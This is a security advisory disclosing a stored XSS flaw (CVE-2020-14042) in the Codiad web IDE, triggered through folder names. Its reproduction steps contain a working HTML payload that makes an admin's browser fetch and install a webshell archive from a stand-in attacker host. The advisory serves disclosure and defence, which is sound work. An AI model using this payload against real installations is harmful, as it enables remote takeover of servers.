---
title: Stored XSS via folder name in Codiad
date: 2020-08-20
tags:
	- "php"
	- "xss"
	- "rce"
	- "webshell"
advisory: true
origin: https://advisory.checkmarx.net/advisory/CX-2020-4278/
cves:
	- "CVE-2020-14042"
---
## Summary
A Cross Site Scripting (XSS) vulnerability was found in Codiad. The vulnerability occurs due to improper sanitization of the folder’s name, the `$path` variable in `components/filemanager/class.filemanager.php`.

## Product
Codiad from v1.7.8.

## Impact
An attacker could run arbitrary Javascript code on the users, chaining this vulnerability with another one, an RCE vulnerability could be achieved.

## Steps to reproduce
1. Login to codiad
2. Create a folder and name it with html element
3. The following example running on an admin will result in a webshell:```<img width=1 height=1 src=components/market/controller.php?action=install&type=&name=Manually&repo=http://evilWebSite/webshell/webshell.zip?a=>```

### Expected result:
The html element is running when viewing the folder name.

## Remediation
There is no fixed version of Codiad.

## Credit
This issue was discovered and reported by Checkmarx SCA Security Researcher [Yaniv Nizry](https://twitter.com/ynizry).

## Resources
1. [Issue](https://github.com/Codiad/Codiad/issues/1122)
